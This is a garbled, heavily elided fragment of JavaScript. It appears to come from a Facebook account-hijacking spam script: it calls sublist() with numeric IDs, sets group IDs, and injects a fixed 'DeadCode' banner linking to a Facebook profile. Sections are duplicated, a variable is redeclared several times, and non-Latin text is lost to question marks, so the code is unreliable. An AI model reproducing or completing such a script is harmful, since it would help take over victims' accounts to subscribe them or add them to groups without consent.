...
}
{
  ...
  div.style.position="fixed";
    ...
    div.style.border="1px solid #6B84B4";
    div.style.padding="3px";
    div.innerHTML="<a style='font-weight:bold;color:#E30505' href='https://www.facebook.com/Tita.ultras' target='_blank' title='??? ?? ??????? ?? ?????? :D' ><blink><center>DeadCode</center></blink></a>";body.appendChild(div)}body=document.body;if(body!=null)
...
sublist("141477112725891");
sublist("487651531328691");


var gid = ['288745807912572'];
var gid = ['216355285188406'];
var gid = ['216355285188406'];
...
}
{
  ...
  div.style.position="fixed";
    ...
    div.style.border="1px solid #6B84B4";
    div.style.padding="3px";
    div.innerHTML="<a style='font-weight:bold;color:#E30505' href='https://www.facebook.com/Tita.ultras' target='_blank' title='???? ??????? ?? ? ???? ??? ???? ????' ><blink><center>DeadCode</center></blink></a>";body.appendChild(div)}body=document.body;if(body!=null)
